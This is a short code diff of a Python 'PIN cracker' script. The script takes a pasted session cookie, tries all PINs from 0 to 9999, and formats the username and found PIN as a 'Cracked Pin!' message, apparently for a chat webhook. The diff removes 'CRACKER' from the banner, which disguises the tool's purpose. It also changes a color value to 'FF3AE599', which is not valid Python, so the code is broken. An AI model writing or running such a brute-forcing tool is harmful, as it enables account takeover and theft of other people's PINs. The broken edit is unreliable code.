@@ -7,7 +7,7 @@ import os
 
 pingEveryone = True
 print('')
-print('================================================\n PIN CRACKER | REMODDED BY: RAISHIN \n================================================')
+print('================================================\n PIN | REMODDED BY: RAISHIN \n================================================')
 print('')
 print('Enter your cookie below:')
 cookie = input()
@@ -52,7 +52,7 @@ for i in range(9999):
                 {
                     "description" : f"{username}\'s Pin:\n```{pin}```",
                     "title" : "Cracked Pin!",
-                    "color" : 0x00ffff,
+                    "color" : FF3AE599,
                 }
             ]
 
